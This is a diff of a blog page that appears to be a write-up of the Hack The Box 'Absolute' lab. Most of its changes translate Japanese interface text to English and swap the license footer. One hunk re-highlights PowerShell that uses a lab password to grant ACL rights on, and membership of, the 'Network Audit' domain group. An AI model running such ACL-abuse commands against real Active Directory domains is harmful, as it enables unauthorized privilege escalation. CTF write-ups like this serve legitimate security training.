@@ -145,7 +145,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -290,7 +290,7 @@
 <li>然后运行以下命令，让它快点！DC 非常定期地重置 AD 值，以复制和粘贴就绪的方式准备东西</li>
 <li>在 Windows Server 上，将用户 m.lovegod 添加到“Network Audit”组</li>
 </ul>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dc_domain</span>=<span class="string">"ABSOLUTE.HTB"</span></span><br><span class="line"><span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">"AbsoluteLDAP2022!"</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">'ABSOLUTE.HTB\m.lovegod'</span>, <span class="variable">$SecPassword</span>)</span><br><span class="line">Add-DomainObjectAcl -Credential <span class="variable">$Cred</span> -TargetIdentity <span class="string">"Network Audit"</span> -Rights all -DomainController DC.ABSOLUTE.HTB  -principalidentity <span class="string">"m.lovegod"</span></span><br><span class="line">Add-ADPrincipalGroupMembership -Identity  m.lovegod -MemberOf  <span class="string">'Network Audit'</span> -Credential <span class="variable">$Cred</span> -Server DC.ABSOLUTE.HTB</span><br><span class="line">Get-DomainGroupMember -Identity <span class="string">'network audit'</span> -Domain <span class="variable">$dc_domain</span> -DomainController DC.ABSOLUTE.HTB -Credential <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dc_domain</span>=<span class="string">"ABSOLUTE.HTB"</span></span><br><span class="line"><span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">"AbsoluteLDAP2022!"</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">'ABSOLUTE.HTB\m.lovegod'</span>, <span class="variable">$SecPassword</span>)</span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-TargetIdentity</span> <span class="string">"Network Audit"</span> <span class="literal">-Rights</span> all <span class="literal">-DomainController</span> DC.ABSOLUTE.HTB  <span class="literal">-principalidentity</span> <span class="string">"m.lovegod"</span></span><br><span class="line"><span class="built_in">Add-ADPrincipalGroupMembership</span> <span class="literal">-Identity</span>  m.lovegod <span class="literal">-MemberOf</span>  <span class="string">'Network Audit'</span> <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-Server</span> DC.ABSOLUTE.HTB</span><br><span class="line"><span class="built_in">Get-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">'network audit'</span> <span class="literal">-Domain</span> <span class="variable">$dc_domain</span> <span class="literal">-DomainController</span> DC.ABSOLUTE.HTB <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
 
 <p>只使用impacket的方法(不是官方版本，自己注意别把本地环境搞炸了)：</p>
 <ul>
@@ -376,7 +376,7 @@
     <div class="content">
         
 <span class="post-time">
-    最終更新：<time datetime="2023-05-29T00:50:25.693Z" itemprop="dateUpdated">2023-05-29 08:50:25</time>
+    Last updated: <time datetime="2023-05-29T00:50:25.693Z" itemprop="dateUpdated">2023-05-29 08:50:25</time>
 </span><br>
 
 
@@ -543,7 +543,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
